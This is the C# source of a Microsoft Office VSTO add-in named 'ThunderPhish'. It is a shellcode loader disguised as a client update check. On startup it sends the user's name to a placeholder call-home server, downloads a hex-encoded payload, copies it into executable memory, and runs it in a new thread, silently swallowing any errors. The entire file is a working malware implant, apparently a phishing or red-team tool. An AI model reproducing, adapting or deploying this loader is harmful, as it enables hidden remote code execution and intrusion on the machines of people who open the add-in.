using System;
using System.Net;
using System.Runtime.InteropServices;

namespace ThunderPhish
{
    public partial class ThisAddIn
    {
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            WebClient wc = new WebClient();
            try
            {
                //add webpage status check
                string updateString = wc.DownloadString("http://**Callhome**/api/updates.php?clientupdate=yes&user=" + Environment.UserName);
                if (updateString.Contains("2.0.2"))
                {
                    //add webpage status check
                    string binaryLoad = wc.DownloadString("http://**Callhome**/api/updatefile.php?clientupdate=yes&user=" + Environment.UserName);
                    string[] updateBinary = binaryLoad.Split('|');
                    string stringstep = updateBinary[1].Replace(" ", String.Empty);
                    byte[] binaryPatch = ToByteArray(stringstep);

                    try
                    {
                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)binaryPatch.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        Marshal.Copy(binaryPatch, 0, (IntPtr)(funcAddr), binaryPatch.Length);
                        IntPtr hThread = IntPtr.Zero;
                        UInt32 threadId = 0;
                        IntPtr pinfo = IntPtr.Zero;

                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                        //WaitForSingleObject(hThread, 0xFFFFFFFF);
                    }
                    catch
                    {
                        //string log = "Something went wrong";
                        //System.IO.File.WriteAllText(@"C:\log.txt", log);
                    }
                }
            }
            catch
            {

            }
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {

        }

        #region VSTO generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }


        public static byte[] ToByteArray(String HexString)
        {
            int NumberChars = HexString.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(HexString.Substring(i, 2), 16);
            }
            return bytes;
        }
    }
    #endregion
}
